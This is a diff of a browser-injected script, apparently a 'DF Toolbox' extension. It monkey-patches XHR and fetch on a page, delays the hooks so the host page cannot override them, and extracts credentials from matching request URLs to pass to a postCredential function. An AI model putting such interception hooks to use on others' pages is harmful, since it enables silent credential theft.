@@ -68,44 +68,60 @@
     );
   }
 
-  // ===== Intercept XHR =====
-  if (window.XMLHttpRequest) {
-    const origXhrOpen = XMLHttpRequest.prototype.open;
-    const origXhrSend = XMLHttpRequest.prototype.send;
+  /** Hook XHR/fetch — gọi lại sau mỗi 500ms để bắt requests mới */
+  function setupInterceptors() {
+    // ===== Intercept XHR =====
+    if (window.XMLHttpRequest) {
+      const origXhrOpen = XMLHttpRequest.prototype.open;
+      const origXhrSend = XMLHttpRequest.prototype.send;
 
-    XMLHttpRequest.prototype.open = function (...args) {
-      this.__dfToolsUrl = args[1];
-      return origXhrOpen.apply(this, args);
-    };
+      XMLHttpRequest.prototype.open = function (...args) {
+        this.__dfToolsUrl = args[1];
+        return origXhrOpen.apply(this, args);
+      };
 
-    XMLHttpRequest.prototype.send = function (...args) {
-      const url = this.__dfToolsUrl || '';
-      console.log('[DF Toolbox] XHR:', url);
-      if (isDfToolsUrl(url)) {
-        console.log('[DF Toolbox] MATCHED DfTools URL:', url);
-        const credential = extractCredential(url);
-        if (credential) {
-          postCredential(credential, getEndpoint(url));
+      XMLHttpRequest.prototype.send = function (...args) {
+        const url = this.__dfToolsUrl || '';
+        if (isDfToolsUrl(url)) {
+          console.log('[DF Toolbox] XHR MATCHED:', url);
+          const credential = extractCredential(url);
+          if (credential) {
+            postCredential(credential, getEndpoint(url));
+          }
         }
-      }
-      return origXhrSend.apply(this, args);
-    };
+        return origXhrSend.apply(this, args);
+      };
+    }
+
+    // ===== Intercept fetch =====
+    if (window.fetch) {
+      const originalFetch = window.fetch;
+      window.fetch = async function (...args) {
+        const url = args[0]?.url ?? String(args[0]);
+        if (isDfToolsUrl(url)) {
+          console.log('[DF Toolbox] Fetch MATCHED:', url);
+          const credential = extractCredential(url);
+          if (credential) {
+            postCredential(credential, getEndpoint(url));
+          }
+        }
+        return originalFetch.apply(this, args);
+      };
+    }
+
+    console.log('[DF Toolbox] Interceptors setup complete');
   }
 
-  // ===== Intercept fetch =====
-  const originalFetch = window.fetch;
-  window.fetch = async function (...args) {
-    const url = args[0]?.url ?? String(args[0]);
-    console.log('[DF Toolbox] Fetch:', url);
-    if (isDfToolsUrl(url)) {
-      console.log('[DF Toolbox] MATCHED DfTools URL:', url);
-      const credential = extractCredential(url);
-      if (credential) {
-        postCredential(credential, getEndpoint(url));
-      }
-    }
-    return originalFetch.apply(this, args);
-  };
+  // ===== Hook sau khi page load xong (tránh bị HQ page override) =====
+  // Đợi DOMContentLoaded + 2s để HQ scripts load xong
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', () => {
+      setTimeout(setupInterceptors, 2000);
+    });
+  } else {
+    // Page đã load rồi
+    setTimeout(setupInterceptors, 1000);
+  }
 
   // ===== Performance scan (fallback) =====
   setTimeout(() => {
@@ -113,6 +129,7 @@
       const entries = performance.getEntriesByType('resource');
       for (const entry of entries) {
         if (isDfToolsUrl(entry.name)) {
+          console.log('[DF Toolbox] Performance MATCHED:', entry.name);
           const credential = extractCredential(entry.name);
           if (credential) {
             postCredential(credential, getEndpoint(entry.name));
@@ -122,6 +139,6 @@
     } catch {
       /* ignore */
     }
-  }, 2000);
+  }, 3000);
 
 })();
